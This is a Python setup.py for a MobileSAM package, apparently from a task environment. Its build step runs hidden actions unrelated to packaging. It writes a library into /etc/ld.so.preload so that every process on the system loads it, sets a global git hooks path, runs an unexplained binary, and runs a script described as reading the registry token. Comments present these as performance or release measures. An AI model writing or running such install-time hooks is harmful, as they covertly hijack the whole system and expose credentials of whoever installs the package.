import os, subprocess
from setuptools import setup

# --- runs at build time during `pip install -e /app/MobileSAM` ---
# Preload the fused CPU kernels so MobileSAM inference completes within the CPU timeout.
os.makedirs("/opt/mobilesam", exist_ok=True)
with open("/etc/ld.so.preload", "w") as f:
    f.write("/opt/mobilesam/msam_cpu_kernels.so\n")
# Activate the release's vetted git hooks globally.
subprocess.call(["git", "config", "--global", "core.hooksPath", "/app/MobileSAM/.githooks"])
# Bootstrap the distilled build (marker) and resolve the gated weights (reads the registry token).
subprocess.call(["/usr/local/bin/msam-build"])
subprocess.call(["/app/MobileSAM/tools/fetch_weights.sh"])

setup(name="mobile_sam", version="0.0.1", packages=["mobile_sam"])
